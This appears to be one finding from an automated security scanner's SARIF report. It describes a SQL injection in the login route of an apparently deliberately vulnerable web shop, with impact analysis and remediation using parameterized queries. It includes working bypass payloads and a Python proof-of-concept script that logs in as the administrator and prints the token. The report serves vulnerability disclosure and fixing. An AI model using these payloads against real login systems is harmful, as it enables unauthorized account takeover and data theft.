          "ruleId": "CWE-89",
          "level": "error",
          "message": {
            "text": "SQL Injection in Login Endpoint Enables Authentication Bypass"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/login.ts"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "snippet": {
                    "text": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge"
                  }
                }
              },
              "message": {
                "text": "User-supplied email directly interpolated into SQL query without parameterization"
              }
            }
          ],
          "properties": {
            "security-severity": "9.1",
            "strix": {
              "id": "vuln-0001",
              "severity": "critical",
              "cvss": 9.1,
              "timestamp": "2026-05-09 10:55:19 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/rest/user/login",
              "method": "POST",
              "cwe": "CWE-89",
              "impact": "Successful exploitation enables complete authentication bypass. An attacker can:\n\n- Gain immediate administrative access to the application without any valid credentials\n- Access any user account by targeting specific email addresses with comment-based password bypass (e.g., `victim@email.com'--`)\n- Enumerate all user accounts through error-based or time-based blind injection techniques\n- Potentially extract sensitive data from the underlying SQLite database through more advanced injection payloads\n\nThe business impact is severe: full compromise of the authentication mechanism, access to all customer data, ability to perform administrative actions, and complete loss of confidentiality and integrity for all user accounts.",
              "technical_analysis": "The vulnerability exists because the login route handler uses JavaScript template literals to construct a raw SQL query, directly interpolating the user-supplied `req.body.email` value without any sanitization or parameterization.\n\nThe query on line 34 of `routes/login.ts`:\n```sql\nSELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${security.hash(req.body.password)}' AND deletedAt IS NULL\n```\n\nWhen the email field contains `' OR 1=1--`, the resulting query becomes:\n```sql\nSELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...' AND deletedAt IS NULL\n```\n\nThe `OR 1=1` makes the WHERE clause universally true, and `--` comments out the remaining conditions (password check and soft-delete filter). The query returns all non-deleted users, and because `plain: true` is set in Sequelize options, only the first result is returned — which is the administrator account (id=1).\n\nA more targeted variant uses `admin@juice-sh.op'--` as the email, producing:\n```sql\nSELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...' AND deletedAt IS NULL\n```\n\nThis matches the admin user specifically while commenting out the password verification, enabling targeted account takeover.\n\nThe password field is not directly injectable because it is hashed via `security.hash()` before interpolation, but the email field provides a fully exploitable vector.",
              "remediation_steps": "1. Replace the raw SQL query with a parameterized query using Sequelize's built-in parameter binding:\n\n```typescript\nmodels.sequelize.query(\n  'SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL',\n  {\n    replacements: { email: req.body.email || '', password: security.hash(req.body.password || '') },\n    model: UserModel,\n    plain: true\n  }\n)\n```\n\n2. Alternatively, use Sequelize's ORM methods which automatically parameterize inputs:\n\n```typescript\nUserModel.findOne({\n  where: {\n    email: req.body.email || '',\n    password: security.hash(req.body.password || ''),\n    deletedAt: null\n  }\n})\n```\n\n3. Implement input validation on the email field to reject values containing SQL metacharacters before they reach the query layer.\n\n4. Apply the principle of least privilege to the database connection to limit the impact of any residual injection vectors.\n\n5. Deploy a Web Application Firewall (WAF) as a defense-in-depth measure to detect and block common SQL injection patterns.",
              "poc": {
                "description": "To reproduce:\n\n1. Send a POST request to /rest/user/login with the email field set to a SQL injection payload that creates a tautology condition and comments out the password check.\n2. Observe that the server returns HTTP 200 with a valid JWT authentication token for the administrator account.\n3. Verify the returned token grants administrative access.\n\nTwo exploitation variants were validated:\n- Generic bypass: `' OR 1=1--` returns the first user (admin)\n- Targeted bypass: `admin@juice-sh.op'--` bypasses password for a specific account",
                "script": "import requests\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Variant 1: Generic authentication bypass - logs in as first user (admin)\nprint(\"[*] Testing SQL Injection auth bypass (generic)...\")\nresp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"' OR 1=1--\", \"password\": \"anything\"},\n    headers={\"Content-Type\": \"application/json\"}\n)\n\nprint(f\"[*] Status Code: {resp.status_code}\")\nif resp.status_code == 200:\n    data = resp.json()\n    auth = data.get(\"authentication\", {})\n    print(f\"[+] Authentication bypass successful!\")\n    print(f\"[+] Logged in as: {auth.get('umail')}\")\n    print(f\"[+] Token: {auth.get('token', '')[:80]}...\")\n    print(f\"[+] Basket ID: {auth.get('bid')}\")\nelse:\n    print(f\"[-] Failed: {resp.text[:200]}\")\n\nprint()\n\n# Variant 2: Targeted account takeover - specific user without password\nprint(\"[*] Testing targeted account takeover (admin@juice-sh.op)...\")\nresp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"admin@juice-sh.op'--\", \"password\": \"wrongpassword\"},\n    headers={\"Content-Type\": \"application/json\"}\n)\n\nprint(f\"[*] Status Code: {resp.status_code}\")\nif resp.status_code == 200:\n    data = resp.json()\n    auth = data.get(\"authentication\", {})\n    print(f\"[+] Targeted auth bypass successful!\")\n    print(f\"[+] Logged in as: {auth.get('umail')}\")\n    print(f\"[+] Token: {auth.get('token', '')[:80]}...\")\nelse:\n    print(f\"[-] Failed: {resp.text[:200]}\")\n\n# Variant 3: Confirm error-based injection indicator\nprint()\nprint(\"[*] Confirming injection via error response...\")\nresp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"'\", \"password\": \"test\"},\n    headers={\"Content-Type\": \"application/json\"}\n)\nprint(f\"[*] Single quote causes HTTP {resp.status_code} (500 = SQL syntax error = confirmed injectable)\")"
              }
            }
          }
        },
